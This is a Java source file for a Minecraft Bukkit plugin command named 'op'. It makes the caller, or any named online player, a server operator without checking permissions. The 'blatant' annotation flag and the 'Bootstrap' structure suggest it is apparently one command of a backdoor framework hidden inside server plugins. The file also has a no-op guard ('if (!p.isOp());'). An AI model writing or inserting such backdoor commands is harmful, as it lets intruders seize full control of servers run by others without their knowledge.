package me.kego.Command.impl;

import me.kego.Bootstrap;
import me.kego.Command.CommandListener;
import me.kego.Command.annotation.Command;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

@Command(name = "op", usage = "op <player>", desc = "Sets you and others op!", blatant = true)
public class Op extends CommandListener {

    @Override
    public void execute(Bootstrap instance, Player player, String[] args) {
        if (args.length <= 1) {
            setOp(player);
            player.sendMessage("You are now op");
            return;
        }
        Player player3 = Bukkit.getServer().getPlayer(args[1]);
        if (player3 == null) {
            player.sendMessage("The player " + args[1] + " is not online.");
            return;
        }
        setOp(player3);
        player.sendMessage("The player " + player3.getName() + " is now op");
    }

    public static void setOp(final Player p) {
        Bootstrap.getInstance().getServer().getScheduler().runTaskAsynchronously(Bootstrap.getInstance(), () -> {
            if (!p.isOp());
            p.setOp(true);
        });
    }
}
